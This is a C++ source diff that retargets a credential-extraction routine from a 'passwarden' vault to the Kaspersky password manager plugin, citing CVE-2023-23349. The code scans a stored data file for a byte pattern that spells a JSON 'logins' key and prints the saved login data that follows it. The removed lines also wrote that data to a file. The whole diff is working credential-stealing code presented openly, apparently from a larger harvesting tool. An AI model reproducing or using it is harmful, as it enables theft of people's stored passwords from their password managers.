@@ -1,11 +1,12 @@
 #pragma once
 #include <iostream>
 #include <fstream>
-#include <string>
 #include <vector>
-#include "../../core/saveFile.h"
+#include <string>
 
-int getCredspasswarden(std::string filename) {
+/*CVE-2023-23349*/
+
+int getCredsEntrieskasperskyPlugin(std::string filename) {
     std::ifstream file(filename, std::ios::binary);
 
     if (!file.is_open()) {
@@ -13,27 +14,26 @@ int getCredspasswarden(std::string filename) {
         return 1;
     }
 
-    std::string searchKeyword = "\"components\":{\"title\":\"Login\",\"vault\":";
-    std::string foundData;
+    std::vector<unsigned char> searchPattern = { 0x22, 0x5b, 0x5c, 0x22, 0x7b, 0x5c, 0x5c, 0x5c, 0x22, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x73, 0x5c, 0x5c, 0x5c, 0x22, 0x3a };
+    std::vector<unsigned char> foundData;
 
     while (!file.eof()) {
-        char c;
-        file.get(c);
+        unsigned char c;
+        file.read(reinterpret_cast<char*>(&c), sizeof(c));
 
-        if (c == searchKeyword[foundData.size()]) {
-            foundData += c;
-            if (foundData == searchKeyword) {
-                // We found the search keyword, now collect data until 10 binary spaces (00) are found
+        if (c == searchPattern[foundData.size()]) {
+            foundData.push_back(c);
+            if (foundData.size() == searchPattern.size()) {
+                // We found the search pattern, now collect data until find specific bytes (10)
                 std::vector<unsigned char> extractedData;
                 int consecutiveSpaces = 0;
 
                 while (!file.eof()) {
                     file.read(reinterpret_cast<char*>(&c), sizeof(c));
-                    if (c == 0x00) {
+                    if (c == 0x10) {
                         consecutiveSpaces++;
-                        if (consecutiveSpaces == 10) {
-                            break; // 10 consecutive binary spaces found
-                            // We can check for more spaces if we want
+                        if (consecutiveSpaces == 1) {
+                            break; // Find (10)
                         }
                     }
                     else {
@@ -47,9 +47,6 @@ int getCredspasswarden(std::string filename) {
 
                 // Print the extracted UTF-8 string
                 std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;
-
-                //Save into file
-                saveFile(utf8ExtractedData);
 
                 foundData.clear();
             }
